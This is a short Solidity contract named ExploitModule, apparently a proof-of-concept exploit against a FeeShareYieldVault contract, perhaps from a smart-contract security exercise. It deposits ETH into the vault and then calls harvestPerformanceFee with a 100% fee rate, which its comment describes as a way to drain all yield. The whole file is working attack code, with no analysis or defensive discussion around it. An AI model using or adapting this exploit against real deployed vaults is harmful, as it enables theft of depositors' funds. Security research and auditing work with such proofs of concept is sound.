// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FeeShareYieldVault} from "../src/FeeShareYieldVault.sol";

contract ExploitModule {
    FeeShareYieldVault public targetContract;

    constructor(address _target) payable {
        targetContract = FeeShareYieldVault(payable(_target));
    }

    function runExploit() external payable {
        // Deposit some ETH to the vault
        targetContract.deposit{value: address(this).balance}();
        
        // Harvest performance fee with 100% fee rate to drain all yield
        targetContract.harvestPerformanceFee(100000);
    }

    receive() external payable {}
}